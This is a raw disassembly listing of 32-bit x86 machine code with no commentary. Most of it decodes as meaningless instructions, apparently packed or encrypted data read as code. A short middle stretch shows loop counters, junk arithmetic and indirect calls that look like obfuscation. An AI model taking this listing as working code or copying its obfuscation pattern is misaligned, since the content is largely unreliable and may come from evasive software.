  411db9:	adc    al,0x47
  411dbb:	mov    ch,0x69
  411dbd:	mov    WORD PTR ds:0x93b96a40,fs
  411dc3:	mov    WORD PTR [ebp+0x1d4fbd2c],fs
  411dc9:	xor    BYTE PTR [ebp+0x27],ah
  411dcc:	dec    edx
  411dcd:	push   0x24962a15
  411dd2:	icebp  
  411dd3:	and    dh,BYTE PTR [eax]
  411dd5:	jnp    0x411d97
  411dd7:	je     0x411d73
  411dd9:	mov    eax,0xff0671a9
  411dde:	mov    ah,0x50
  411de0:	cdq    
  411de1:	pushf  
  411de2:	(bad)  
  411de3:	(bad)  
  411de5:	fbstp  TBYTE PTR ds:0x9337f2e8
  411deb:	in     eax,0x16
  411ded:	fld    QWORD PTR [ebp-0x4d8c9bd6]
  411df3:	mov    dh,0x93
  411df5:	and    edi,DWORD PTR ds:[esi+ebx*4]
  411df9:	in     eax,0xf9
  411dfb:	test   eax,0x56aaff0e
  411e00:	fadd   QWORD PTR [edx+0x28]
  411e03:	gs inc edx
  411e05:	fs jae 0x411dd1
  411e08:	repnz hlt 
  411e0a:	jmp    0x78a5:0x89f63d90
  411e11:	pushf  
  411e12:	adc    BYTE PTR [ebx-0x52],0xf1
  411e16:	pop    edi
  411e17:	pop    ss
  411e18:	sub    al,0x7b
  411e1a:	dec    ebp
  411e1b:	outs   dx,BYTE PTR ds:[esi]
  411e1c:	out    0x3d,al
  411e1e:	mov    BYTE PTR [ebx],dh
  411e20:	iret   
  411e21:	ret    
  411e22:	adc    bh,bl
  411e24:	xchg   ecx,edi
  411e26:	adc    eax,0x267f918c
  411e2b:	imul   ebp,eax,0xffffffe2
  411e2e:	add    BYTE PTR [eax],bh
  411e30:	jmp    0xbfae:0x891fbda7
  411e37:	mov    ebx,0xd2fc9be9
  411e3c:	in     eax,dx
  411e3d:	sub    DWORD PTR [edi-0x435763bc],0xffffffbb
  411e44:	pop    ecx
  411e45:	mov    bl,0x63
  411e47:	adc    ebp,DWORD PTR [ecx+0x31ce4955]
  411e4d:	(bad)  
  411e4e:	retf   0x62c0
  411e51:	jns    0x411df3
  411e53:	cmp    ebx,0xf344fb2d
  411e59:	scas   al,BYTE PTR es:[edi]
  411e5a:	call   0x18cd6c19
  411e5f:	mov    ebx,0xe29cad8d
  411e64:	imul   ebp,DWORD PTR [edx*2-0x3503c042],0xe774bfcc
  411e6f:	pop    eax
  411e70:	jp     0x411e5f
  411e72:	fdiv   st,st(4)
  411e74:	sbb    BYTE PTR [esi+0xcd403c0],ah
  411e7a:	pop    ecx
  411e7b:	jle    0x411eb3
  411e7d:	in     al,0xc8
  411e7f:	xchg   edx,eax
  411e80:	jecxz  0x411e82
  411e82:	in     al,dx
  411e83:	xchg   ebx,eax
  411e84:	xchg   BYTE PTR [esi+0x1af29d26],bh
  411e8a:	arpl   WORD PTR [ebx+0x1293aa9d],si
  411e90:	in     al,0x6d
  411e92:	lahf   
  411e93:	inc    ebx
  411e94:	pop    es
  411e95:	add    eax,0x92fafb81
  411e9a:	sub    cl,bh
  411e9c:	cmp    al,0xac
  411e9e:	cli    
  411e9f:	test   eax,edi
  411ea1:	mov    bh,0xff
  411ea3:	nop
  411ea4:	dec    ebp
  411ea5:	mov    BYTE PTR [edx+0x1f4eabc2],bh
  411eab:	sub    esp,DWORD PTR [ecx]
  411ead:	fidivr DWORD PTR [esi-0x53]
  411eb0:	cmp    edx,ebx
  411eb2:	mov    ebx,0xd8b4932f
  411eb7:	lods   eax,DWORD PTR ds:[esi]
  411eb8:	adc    DWORD PTR [esi],edx
  411eba:	out    0xde,al
  411ebc:	jne    0x411f1d
  411ebe:	cmp    eax,0x7f839ddc
  411ec3:	mov    al,0x16
  411ec5:	in     al,dx
  411ec6:	call   0xec36:0xe3b5267b
  411ecd:	push   ecx
  411ece:	adc    bh,BYTE PTR [edi-0x4c]
  411ed1:	sar    edx,0x7f
  411ed4:	in     eax,dx
  411ed5:	xor    DWORD PTR ss:[edi+0x14b44e4b],edx
  411edc:	and    bh,BYTE PTR [ebp-0x46e6eb35]
  411ee2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ee3:	inc    esp
  411ee4:	inc    esp
  411ee5:	dec    esi
  411ee6:	imul   ebx,DWORD PTR [ebp-0x38d8de9c],0x57
  411eed:	out    0x51,al
  411eef:	retf   
  411ef0:	sbb    al,0x96
  411ef2:	sub    al,BYTE PTR [ebx]
  411ef4:	pop    ecx
  411ef5:	sbb    bh,BYTE PTR [esi]
  411ef7:	cld    
  411ef8:	inc    edx
  411ef9:	inc    ebp
  411efa:	mov    ds:0xa9bb4340,eax
  411eff:	imul   ebx,DWORD PTR ds:0x2a0c87a5,0xffffffff
  411f06:	imul   edi,DWORD PTR [ecx],0xffffffd7
  411f09:	ja     0x411eea
  411f0b:	dec    ebp
  411f0c:	out    0xc0,al
  411f0e:	fs jbe 0x411ee6
  411f11:	mov    dl,0x9d
  411f13:	pop    edi
  411f14:	les    edi,FWORD PTR [edx+ebp*8]
  411f17:	xor    BYTE PTR [ebx],0x14
  411f1a:	arpl   WORD PTR [ebp-0x7e],bp
  411f1d:	lahf   
  411f1e:	rcl    BYTE PTR [esi+0x6db0d84f],cl
  411f24:	mov    DWORD PTR [ebx-0x11],ecx
  411f27:	aaa    
  411f28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f29:	mov    ds:0xc8ec6759,eax
  411f2e:	push   0x6e
  411f30:	cmp    BYTE PTR [esi+ebx*2],ah
  411f33:	push   edi
  411f34:	fdivrp st(7),st
  411f36:	cld    
  411f37:	and    DWORD PTR [ecx-0x68],ecx
  411f3a:	add    BYTE PTR [edx+0x2d54badc],ch
  411f40:	lds    esi,FWORD PTR [eax+0x31b9fbc2]
  411f46:	mov    al,ds:0xc2940086
  411f4b:	gs scas eax,DWORD PTR es:[edi]
  411f4d:	fimul  DWORD PTR [edx-0x10]
  411f50:	into   
  411f51:	push   esp
  411f52:	mov    es,WORD PTR [ecx]
  411f54:	(bad)  
  411f56:	lds    ecx,FWORD PTR [ebp-0x4]
  411f59:	nop
  411f5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f5c:	mov    ?,eax
  411f5e:	into   
  411f5f:	fimul  DWORD PTR [ecx]
  411f61:	pop    es
  411f62:	icebp  
  411f63:	rol    ecx,0xac
  411f66:	(bad)  
  411f67:	push   0xd6b2f567
  411f6c:	push   esi
  411f6d:	mov    al,ds:0xd7cb87d8
  411f72:	cmp    al,0xf7
  411f74:	adc    eax,eax
  411f76:	(bad)  
  411f77:	clc    
  411f78:	in     eax,0x81
  411f7a:	in     eax,0xac
  411f7c:	push   esi
  411f7d:	mov    DWORD PTR [ecx-0x72],eax
  411f80:	lahf   
  411f81:	xchg   ebx,eax
  411f82:	popf   
  411f83:	addr16 out 0x16,eax
  411f86:	(bad)
  411f8a:	fsubrp st(3),st
  411f8c:	mov    esp,0x318eb564
  411f91:	scas   eax,DWORD PTR es:[edi]
  411f92:	stos   DWORD PTR es:[edi],eax
  411f93:	aaa    
  411f94:	test   bh,cl
  411f96:	adc    bl,dl
  411f98:	xchg   ecx,eax
  411f99:	mov    ds:0x1c739534,eax
  411f9e:	sahf   
  411f9f:	pop    ecx
  411fa0:	and    eax,0xbe37443f
  411fa5:	addr16 ret 
  411fa7:	pop    ds
  411fa8:	rcr    ecx,0x48
  411fab:	dec    edi
  411fac:	inc    esp
  411fad:	data16 adc BYTE PTR [edx],0x49
  411fb1:	les    esp,FWORD PTR [ecx]
  411fb3:	mov    ch,0x12
  411fb5:	ucomiss xmm1,DWORD PTR [edx-0x33]
  411fb9:	(bad)  
  411fbb:	fbld   TBYTE PTR [ecx-0x3ab8d36d]
  411fc1:	mov    bh,0x5d
  411fc3:	mov    ebx,0x71c464f
  411fc8:	nop
  411fc9:	xor    eax,0x31608a06
  411fce:	xlat   BYTE PTR ds:[ebx]
  411fcf:	mov    ds:0x1b95a2d0,eax
  411fd4:	push   ds
  411fd5:	outs   dx,BYTE PTR ds:[esi]
  411fd6:	cmp    cl,BYTE PTR [esi+0x43]
  411fd9:	loop   0x411f8d
  411fdb:	inc    edi
  411fdc:	xchg   edi,eax
  411fdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fde:	adc    bh,al
  411fe0:	icebp  
  411fe1:	in     al,0xba
  411fe3:	push   esp
  411fe4:	xchg   DWORD PTR [eax-0x6c],esp
  411fe7:	inc    ecx
  411fe8:	sbb    DWORD PTR [ebx+0xc6d5349],0x92be1fbb
  411ff2:	xchg   DWORD PTR [esi],esp
  411ff4:	cmp    DWORD PTR [eax],esi
  411ff6:	popa   
  411ff7:	inc    edi
  411ff8:	ins    BYTE PTR es:[edi],dx
  411ff9:	and    ah,cl
  411ffb:	imul   ecx,DWORD PTR [ebp+0x255eae53],0x1078b9fd
  412005:	test   al,0xed
  412007:	add    edx,esp
  412009:	cmp    cl,bh
  41200b:	scas   eax,DWORD PTR es:[edi]
  41200c:	xchg   ebx,eax
  41200d:	ins    BYTE PTR es:[edi],dx
  41200e:	xchg   esi,eax
  41200f:	or     dl,BYTE PTR [ebx-0x35]
  412012:	adc    BYTE PTR [ecx-0x33],cl
  412015:	adc    eax,0x3e528f8a
  41201a:	inc    ebx
  41201b:	out    0x61,eax
  41201d:	arpl   WORD PTR [edx-0x28ff419c],bp
  412023:	sbb    bh,BYTE PTR [ebx+0x25e8f6ce]
  412029:	mov    eax,esi
  41202b:	inc    edx
  41202c:	inc    ecx
  41202d:	and    DWORD PTR [esi+0x35],ebx
  412030:	xlat   BYTE PTR ds:[ebx]
  412031:	cmp    dh,BYTE PTR [ecx-0x2c]
  412034:	imul   ecx,DWORD PTR [ecx+0x51],0xc30b89be
  41203b:	ret    0x6cd3
  41203e:	std    
  41203f:	popf   
  412040:	jmp    0x8a2785a1
  412045:	or     DWORD PTR [ebp+0x6f],edi
  412048:	push   0x464a6110
  41204d:	jl     0x4120b7
  41204f:	lods   eax,DWORD PTR ds:[esi]
  412050:	sbb    al,0x88
  412052:	iret   
  412053:	dec    edi
  412054:	ins    DWORD PTR es:[edi],dx
  412055:	xchg   esi,eax
  412056:	jo     0x41206f
  412058:	dec    edx
  412059:	xor    cl,dh
  41205b:	aam    0x5a
  41205d:	pop    ebp
  41205e:	retf   0xaf1b
  412061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412062:	lods   eax,DWORD PTR ds:[esi]
  412063:	call   0x11cf72ad
  412068:	sub    al,0xce
  41206a:	jnp    0x41202d
  41206c:	fwait
  41206d:	and    al,0xa6
  41206f:	mov    edx,0xb049cd38
  412074:	sub    eax,0x80739540
  412079:	frstor [edi]
  41207b:	and    eax,0x654ec3be
  412080:	mov    esp,0xbe8386b7
  412085:	mov    ds:0x52438355,al
  41208a:	into   
  41208b:	repz aaa 
  41208d:	cmp    BYTE PTR [eax-0x74],ch
  412090:	dec    edx
  412091:	fidiv  DWORD PTR [eax+eax*4]
  412094:	adc    al,0x4a
  412096:	shl    DWORD PTR [eax],cl
  412098:	daa    
  412099:	loop   0x412116
  41209b:	div    DWORD PTR [edi-0x449dd782]
  4120a1:	mov    ch,0x60
  4120a3:	push   ecx
  4120a4:	mov    DWORD PTR [ebp+0x39],edi
  4120a7:	xchg   ecx,eax
  4120a8:	out    0x7e,al
  4120aa:	js     0x412063
  4120ac:	(bad)  
  4120ad:	push   0xbc9d98de
  4120b2:	mov    edi,0x377074ed
  4120b7:	fisubr WORD PTR [esi]
  4120b9:	fnstsw WORD PTR [esi]
  4120bb:	int    0xa5
  4120bd:	mov    eax,ds:0xcf301339
  4120c2:	sub    BYTE PTR [ebp-0xd],ch
  4120c5:	adc    ch,dh
  4120c7:	and    BYTE PTR [ebx+0x32],0x2c
  4120cb:	cmp    al,BYTE PTR [esp+edi*4+0x6416293]
  4120d2:	xchg   BYTE PTR [ebx],ch
  4120d4:	add    bl,bl
  4120d6:	sar    ecx,cl
  4120d8:	mov    al,BYTE PTR [ecx+0x1a1daf9a]
  4120de:	retf   
  4120df:	pcmpgtb mm5,QWORD PTR [ecx-0x1e4e6cf9]
  4120e6:	stos   BYTE PTR es:[edi],al
  4120e7:	adc    al,0x6d
  4120e9:	gs retf 
  4120eb:	sbb    BYTE PTR [ecx+0x114a3db],cl
  4120f1:	jmp    0xd82d:0x64a9f725
  4120f8:	(bad)  
  4120f9:	mov    ?,WORD PTR [edi+0x98b8b97]
  4120ff:	pop    es
  412100:	mov    ah,0xae
  412102:	imul   BYTE PTR [ebp+0x1f]
  412105:	fst    DWORD PTR [esi+0x1a]
  412108:	mov    ch,0x19
  41210a:	clc    
  41210b:	les    edi,FWORD PTR [ecx-0x3e]
  41210e:	pop    eax
  41210f:	inc    ecx
  412110:	mov    cs,WORD PTR [edx+0x4daa196b]
  412116:	push   ebp
  412117:	fisttp DWORD PTR [eax+0x2b1656ff]
  41211d:	jno    0x41213a
  41211f:	dec    eax
  412120:	adc    BYTE PTR [ebp-0x6f316d24],ah
  412126:	pop    edi
  412127:	adc    bl,BYTE PTR [esi]
  412129:	mov    edx,0xcff1abda
  41212e:	into   
  41212f:	jl     0x41210f
  412131:	hlt    
  412132:	test   DWORD PTR [ebp-0x62],ecx
  412135:	xor    eax,0x4b02f8a9
  41213a:	aad    0xa8
  41213c:	xchg   DWORD PTR [edx+0x5b],esp
  41213f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412140:	sub    eax,0x405b6286
  412145:	or     ebx,ecx
  412147:	loope  0x4120ec
  412149:	test   BYTE PTR [ecx+0x3],0xb7
  41214d:	call   0xab3e:0xb8abfdba
  412154:	cli    
  412155:	ins    BYTE PTR es:[edi],dx
  412156:	rol    DWORD PTR [edi],1
  412158:	sti    
  412159:	inc    ebx
  41215a:	adc    al,0x77
  41215c:	test   eax,0xfc17442d
  412161:	pusha  
  412162:	fwait
  412163:	sahf   
  412164:	lea    edi,[ecx+0x3a]
  412167:	adc    eax,0xc9451c23
  41216c:	arpl   WORD PTR [esi],bx
  41216e:	inc    ebx
  41216f:	or     al,bh
  412171:	cs ret 
  412173:	xor    edx,DWORD PTR [edi+eax*1-0x5d6bb8e5]
  41217a:	or     esp,DWORD PTR [ebx+ebx*2-0x40]
  41217e:	mov    ds:0x16462399,al
  412183:	and    edx,DWORD PTR [edx]
  412185:	dec    esp
  412186:	jl     0x4121d6
  412188:	push   0xffffff97
  41218a:	aas    
  41218b:	stc    
  41218c:	je     0x4121d9
  41218e:	stos   BYTE PTR es:[edi],al
  41218f:	inc    ecx
  412190:	sbb    DWORD PTR [ebx],ebp
  412192:	pusha  
  412193:	mov    esi,ss
  412195:	aas    
  412196:	mov    ecx,0x583a577c
  41219b:	mov    ?,WORD PTR [edi]
  41219d:	and    al,0xa6
  41219f:	repz adc eax,edi
  4121a2:	lods   al,BYTE PTR ds:[esi]
  4121a3:	inc    esp
  4121a4:	push   ebx
  4121a5:	lods   al,BYTE PTR ds:[esi]
  4121a6:	addr16 dec esi
  4121a8:	bound  edx,QWORD PTR [eax]
  4121aa:	dec    ebp
  4121ab:	fisub  WORD PTR [ebp-0x9]
  4121ae:	dec    esp
  4121af:	dec    ebx
  4121b0:	pop    esp
  4121b1:	imul   ebp,eax,0xffffffba
  4121b4:	inc    edi
  4121b5:	fld    DWORD PTR [edi+0xd]
  4121b8:	inc    ebx
  4121b9:	add    al,0x85
  4121bb:	lea    eax,[edx+eiz*8-0x32]
  4121bf:	or     ebp,eax
  4121c1:	ret    
  4121c2:	lds    ecx,FWORD PTR [ecx*4-0x6fac1d06]
  4121c9:	mov    cl,BYTE PTR [ecx]
  4121cb:	jp     0x4121a4
  4121cd:	pop    es
  4121ce:	mov    bh,0x68
  4121d0:	dec    edi
  4121d1:	retf   
  4121d2:	aaa    
  4121d3:	dec    ebx
  4121d4:	or     dh,ah
  4121d6:	xor    eax,0xe62dc0a2
  4121db:	lock mov BYTE PTR [edi],ah
  4121de:	xchg   edi,eax
  4121df:	outs   dx,BYTE PTR ds:[esi]
  4121e0:	adc    eax,DWORD PTR [ecx-0x14390d2]
  4121e6:	vxorps ymm6,ymm0,YMMWORD PTR [ebx+edi*8+0x7064421]
  4121ef:	cs out dx,eax
  4121f1:	add    DWORD PTR [edx-0x71b5b19d],edx
  4121f7:	xchg   esp,eax
  4121f8:	dec    ecx
  4121f9:	pop    DWORD PTR [edx-0x26]
  4121fc:	push   cs
  4121fd:	dec    eax
  4121fe:	fs push esp
  412200:	and    BYTE PTR ss:[edx+0x3cdd3000],ah
  412207:	add    eax,0x2eb53a1b
  41220c:	cmp    dl,ah
  41220e:	sbb    eax,eax
  412210:	cmp    BYTE PTR [edx],bh
  412212:	sub    edx,edx
  412214:	cwde   
  412215:	jae    0x4121df
  412217:	fsubr  QWORD PTR ds:0x1d643538
  41221d:	fmul   DWORD PTR [edi+0x3ec70f86]
  412223:	sbb    al,0xb7
  412225:	cs mov esp,0xb994b2b
  41222b:	add    eax,0xe6e28ae0
  412230:	cli    
  412231:	xchg   edx,eax
  412232:	mov    edi,0xfc3cce41
  412237:	dec    eax
  412238:	adc    BYTE PTR [ecx+ebx*2+0x6a9567ec],ah
  41223f:	sbb    al,0x66
  412241:	push   ecx
  412242:	dec    ecx
  412243:	dec    edi
  412244:	dec    esi
  412245:	mov    esp,0xb65f9746
  41224a:	push   eax
  41224b:	push   ebx
  41224c:	add    BYTE PTR [ecx+0x79ab7bfa],ch
  412252:	xchg   edi,eax
  412253:	pop    ss
  412254:	std    
  412255:	push   0x23
  412257:	div    edi
  412259:	xchg   BYTE PTR [edx-0x49c6b4d3],ch
  41225f:	jg     0x412227
  412261:	pop    ss
  412262:	(bad)  
  412263:	aaa    
  412264:	outs   dx,BYTE PTR ds:[esi]
  412265:	(bad)  
  412266:	(bad)  
  412267:	gs dec esp
  412269:	stc    
  41226a:	out    dx,al
  41226b:	push   esp
  41226c:	(bad)  
  41226d:	mov    bh,0x39
  41226f:	lahf   
  412270:	lods   eax,DWORD PTR ds:[esi]
  412271:	jmp    0x41226f
  412273:	jg     0x412274
  412275:	xor    DWORD PTR [edi-0x77],0xfffffffb
  412279:	and    eax,DWORD PTR [esi]
  41227b:	cmp    esi,edx
  41227d:	rcl    BYTE PTR [esi-0x68c91964],cl
  412283:	int3   
  412284:	out    dx,al
  412285:	pop    edi
  412286:	sbb    al,BYTE PTR [eax-0xb]
  412289:	mov    bl,ch
  41228b:	pusha  
  41228c:	cdq    
  41228d:	inc    edx
  41228e:	and    BYTE PTR [ebp-0xc39a53b],ah
  412294:	xchg   ebx,eax
  412295:	ins    BYTE PTR es:[edi],dx
  412296:	xchg   DWORD PTR [eax-0x346f3f51],eax
  41229c:	xchg   ebx,eax
  41229d:	aam    0x16
  41229f:	add    edi,DWORD PTR [esi]
  4122a1:	fidiv  WORD PTR [ebx-0x6f96ef28]
  4122a7:	jno    0x41231a
  4122a9:	stos   DWORD PTR es:[edi],eax
  4122aa:	out    0xb7,eax
  4122ac:	enter  0xb5ae,0xf6
  4122b0:	xchg   ecx,eax
  4122b1:	jbe    0x41229d
  4122b3:	in     al,0xfc
  4122b5:	push   cs
  4122b6:	retf   0x5a9b
  4122b9:	mov    ecx,DWORD PTR [edx+0x72]
  4122bc:	pop    eax
  4122bd:	arpl   WORD PTR [ebx],sp
  4122bf:	jge    0x41231d
  4122c1:	ficom  DWORD PTR [eax-0x397171e5]
  4122c7:	xlat   BYTE PTR ds:[ebx]
  4122c8:	leave  
  4122c9:	mov    ebp,0xfe677e8d
  4122ce:	int    0xa4
  4122d0:	jns    0x412278
  4122d2:	nop
  4122d3:	call   0xd36d:0x74500058
  4122da:	and    eax,0xd4c97c14
  4122df:	aaa    
  4122e0:	fild   DWORD PTR [edx]
  4122e2:	call   0xf97a3094
  4122e7:	sub    DWORD PTR [esi],ebx
  4122e9:	mov    ecx,0x55a712c7
  4122ee:	(bad)  
  4122ef:	iret   
  4122f0:	mov    ebx,ecx
  4122f2:	out    0x95,al
  4122f4:	inc    edi
  4122f5:	xchg   DWORD PTR [eax+0x701d9d90],ebx
  4122fb:	bound  edx,QWORD PTR [edi-0x7899306]
  412301:	cdq    
  412302:	lahf   
  412303:	loope  0x4122e1
  412305:	xchg   BYTE PTR [ecx],dh
  412307:	xchg   esp,eax
  412308:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412309:	clc    
  41230a:	add    al,0x16
  41230c:	arpl   WORD PTR [eax-0x2a3f225f],di
  412312:	out    dx,al
  412313:	int3   
  412314:	mov    edi,0xc4520c5a
  412319:	dec    ebp
  41231a:	cmc    
  41231b:	cs adc al,ch
  41231e:	shl    esp,cl
  412320:	hlt    
  412321:	jae    0x412338
  412323:	fiadd  DWORD PTR [edi-0x10]
  412326:	arpl   dx,dx
  412328:	cmc    
  412329:	cwde   
  41232a:	lods   al,BYTE PTR ds:[esi]
  41232b:	jp     0x4123ac
  41232d:	into   
  41232e:	xchg   BYTE PTR [ecx],dl
  412330:	mov    bh,0x6
  412332:	popa   
  412333:	(bad)  
  412334:	stos   DWORD PTR es:[edi],eax
  412335:	jle    0x4122d5
  412337:	ja     0x412377
  412339:	outs   dx,BYTE PTR ds:[esi]
  41233a:	pop    edx
  41233b:	mov    ah,0x5
  41233d:	imul   esp,DWORD PTR ds:0xe88c919a,0x38c24405
  412347:	xchg   edi,eax
  412348:	or     bh,dh
  41234a:	sub    ch,BYTE PTR [ecx+0x2e]
  41234d:	ja     0x4122d6
  41234f:	ins    BYTE PTR es:[edi],dx
  412350:	and    bh,ch
  412352:	lods   al,BYTE PTR ds:[esi]
  412353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412354:	clc    
  412355:	arpl   dx,bp
  412357:	sub    ebp,ecx
  412359:	mov    edx,DWORD PTR [ebp+0x8]
  41235c:	and    DWORD PTR ds:0x42b21a,0x0
  412366:	jmp    0x41237a
  41236b:	xor    ebx,ebx
  41236d:	xor    ebx,DWORD PTR ds:0x42b21a
  412373:	inc    ebx
  412374:	mov    DWORD PTR ds:0x42b21a,ebx
  41237a:	cmp    DWORD PTR ds:0x42b21a,0x18
  412381:	jae    0x4123c1
  412387:	cmp    DWORD PTR ds:0x42b21a,0x4
  41238e:	jg     0x4123c1
  412394:	jmp    0x4123a2
  412399:	push   DWORD PTR [ebp-0x18]
  41239c:	call   DWORD PTR ds:0x42b316
  4123a2:	cmp    DWORD PTR ds:0x42b21a,0x3
  4123a9:	jne    0x4123bc
  4123af:	mov    ebx,DWORD PTR ds:0x42b21a
  4123b5:	inc    ebx
  4123b6:	mov    DWORD PTR ds:0x42b21a,ebx
  4123bc:	jmp    0x41236b
  4123c1:	mov    ebx,DWORD PTR [ebp-0x54]
  4123c4:	mov    DWORD PTR ds:0x42b21a,0x6966
  4123ce:	add    edx,0x64f880
  4123d4:	or     edx,ebx
  4123d6:	mov    DWORD PTR [ebp-0x54],edx
  4123d9:	mov    edx,DWORD PTR [ebp+0x8]
  4123dc:	xor    DWORD PTR ds:0x42b1b2,edx
  4123e2:	mov    ebx,DWORD PTR [ebp-0x50]
  4123e5:	and    DWORD PTR ds:0x42b226,0x42b18e
  4123ef:	add    edx,ecx
  4123f1:	sbb    DWORD PTR ds:0x42b1ee,0x42b196
  4123fb:	xor    edx,ebx
  4123fd:	mov    DWORD PTR [ebp-0x50],edx
  412400:	mov    DWORD PTR ds:0x42b226,0x2b16
  41240a:	mov    edx,DWORD PTR [ebp+0x8]
  41240d:	and    DWORD PTR ds:0x42b19e,0x0
  412417:	mov    ebx,DWORD PTR ds:0x42b19e
  41241d:	inc    ebx
  41241e:	mov    DWORD PTR ds:0x42b19e,ebx
  412424:	cmp    DWORD PTR ds:0x42b19e,0xc
  41242b:	ja     0x41246b
  412431:	jmp    0x412444
  412436:	push   DWORD PTR [ebp-0x10]
  412439:	push   0x7c16
  41243e:	call   DWORD PTR ds:0x42b31a
  412444:	cmp    DWORD PTR ds:0x42b19e,0xb
  41244b:	jne    0x41245e
  412451:	mov    ebx,DWORD PTR ds:0x42b19e
  412457:	inc    ebx
  412458:	mov    DWORD PTR ds:0x42b19e,ebx
  41245e:	cmp    DWORD PTR ds:0x42b19e,0x13
  412465:	jb     0x412417
  41246b:	mov    ebx,DWORD PTR [ebp-0x4c]
  41246e:	add    edx,edi
  412470:	and    edx,ebx
  412472:	mov    ebx,DWORD PTR ds:0x42b206
  412478:	add    DWORD PTR ds:0x42b1c6,ebx
  41247e:	mov    DWORD PTR [ebp-0x4c],edx
  412481:	add    DWORD PTR ds:0x42b19a,0x5c82
  41248b:	mov    edx,DWORD PTR [ebp+0x8]
  41248e:	mov    ebx,DWORD PTR [ebp-0x48]
  412491:	lea    edx,[ebx+edx*1+0x241fcdf]
  412498:	mov    DWORD PTR [ebp-0x48],edx
  41249b:	mov    edx,DWORD PTR [ebp+0x8]
  41249e:	mov    ebx,0xfa5e1524
  4124a3:	sub    ebx,edx
  4124a5:	add    ebx,DWORD PTR [ebp-0x44]
  4124a8:	mov    DWORD PTR [ebp-0x44],ebx
  4124ab:	mov    edx,DWORD PTR [ebp+0x8]
  4124ae:	xor    edx,eax
  4124b0:	add    edx,esi
  4124b2:	jne    0x40fdfa
  4124b8:	jmp    0x419191
  4124bd:	mov    edx,DWORD PTR [ebp-0xc]
  4124c0:	sub    edx,esi
  4124c2:	xor    edx,eax
  4124c4:	mov    DWORD PTR [ebp-0x5c],edx
  4124c7:	mov    edx,DWORD PTR [ebp-0x10]
  4124ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4124cd:	xor    edx,eax
  4124cf:	xor    ebx,eax
  4124d1:	sub    edx,ebx
  4124d3:	sub    edx,esi
  4124d5:	xor    edx,eax
  4124d7:	mov    DWORD PTR [ebp-0x10],edx
  4124da:	mov    edx,DWORD PTR [ebp-0x14]
  4124dd:	mov    DWORD PTR [ebp+0x8],edx
  4124e0:	jmp    0x4148b5
  4124e5:	mov    edx,DWORD PTR [ebp+0x8]
  4124e8:	mov    ebx,DWORD PTR [ebp-0x8]
  4124eb:	xor    edx,eax
  4124ed:	xor    ebx,eax
  4124ef:	sub    edx,ebx
  4124f1:	sub    edx,esi
  4124f3:	xor    edx,eax
  4124f5:	mov    DWORD PTR [ebp+0x8],edx
  4124f8:	mov    edx,DWORD PTR [ebp+0x8]
  4124fb:	mov    ebx,DWORD PTR [ebp-0x58]
  4124fe:	add    edx,0x5708e2
  412504:	imul   edx,ebx
  412507:	mov    DWORD PTR [ebp-0x58],edx
  41250a:	mov    edx,DWORD PTR [ebp+0x8]
  41250d:	mov    ebx,DWORD PTR [ebp-0x54]
  412510:	add    edx,0x64f880
  412516:	or     edx,ebx
  412518:	mov    DWORD PTR [ebp-0x54],edx
  41251b:	mov    edx,DWORD PTR [ebp+0x8]
  41251e:	mov    ebx,DWORD PTR [ebp-0x50]
  412521:	add    edx,ecx
  412523:	xor    edx,ebx
  412525:	mov    DWORD PTR [ebp-0x50],edx
  412528:	mov    edx,DWORD PTR [ebp+0x8]
  41252b:	mov    ebx,DWORD PTR [ebp-0x4c]
  41252e:	add    edx,edi
  412530:	and    edx,ebx
  412532:	mov    DWORD PTR [ebp-0x4c],edx
  412535:	mov    edx,DWORD PTR [ebp+0x8]
  412538:	mov    ebx,DWORD PTR [ebp-0x48]
  41253b:	lea    edx,[ebx+edx*1+0x241fcdf]
  412542:	mov    DWORD PTR [ebp-0x48],edx
  412545:	mov    edx,DWORD PTR [ebp+0x8]
  412548:	mov    ebx,0xfa5e1524
  41254d:	sub    ebx,edx
  41254f:	add    ebx,DWORD PTR [ebp-0x44]
  412552:	mov    DWORD PTR [ebp-0x44],ebx
  412555:	jmp    0x4148b5
  41255a:	xlat   BYTE PTR ds:[ebx]
  41255b:	push   ss
  41255c:	xchg   BYTE PTR [ebx-0x7e],dh
  41255f:	repz xchg edx,eax
  412561:	add    BYTE PTR [eax-0x49],0xdb
  412565:	div    BYTE PTR [ecx-0x70]
  412568:	push   edi
  412569:	scas   eax,DWORD PTR es:[edi]
  41256a:	cli    
  41256b:	mov    al,BYTE PTR [ebx-0x7ca1c17d]
  412571:	sbb    DWORD PTR [edi+0x7aab513b],0x27
  412578:	and    DWORD PTR [ecx+ebx*8+0x7],edi
  41257c:	es call 0x8260862c
  412582:	sub    BYTE PTR [edi+0x5b],0x6b
  412586:	(bad)  
  412587:	sub    eax,0x389bdde6
  41258c:	ins    DWORD PTR es:[edi],dx
  41258d:	push   0x22271891
  412592:	rcl    dh,0xbf
  412595:	inc    esi
  412596:	mov    ebx,0xb5fcd3e1
  41259b:	dec    ebp
  41259c:	xchg   ebp,eax
  41259d:	popa   
  41259e:	cdq    
  41259f:	lods   eax,DWORD PTR ds:[esi]
  4125a0:	push   cs
  4125a1:	lds    edi,FWORD PTR [ecx+0x50c57a30]
  4125a7:	pop    eax
  4125a8:	test   al,0xf7
  4125aa:	xchg   edx,eax
  4125ab:	mov    fs,WORD PTR [eax+eax*8]
  4125ae:	jge    0x412606
  4125b0:	mov    ch,0x46
  4125b2:	mov    dl,0x42
  4125b4:	ins    BYTE PTR es:[edi],dx
  4125b5:	sbb    al,0xde
  4125b7:	ins    BYTE PTR es:[edi],dx
  4125b8:	jns    0x41262a
  4125ba:	inc    edi
  4125bb:	xor    eax,DWORD PTR [edi]
  4125bd:	(bad)  
  4125bf:	cmp    BYTE PTR [edi],dh
  4125c1:	cmp    ch,BYTE PTR [ebx+0x47]
  4125c4:	rcl    DWORD PTR [eax-0x9],cl
  4125c7:	add    al,0x49
  4125c9:	jbe    0x41262c
  4125cb:	xor    eax,0x610054e7
  4125d0:	add    eax,0x3e52b82e
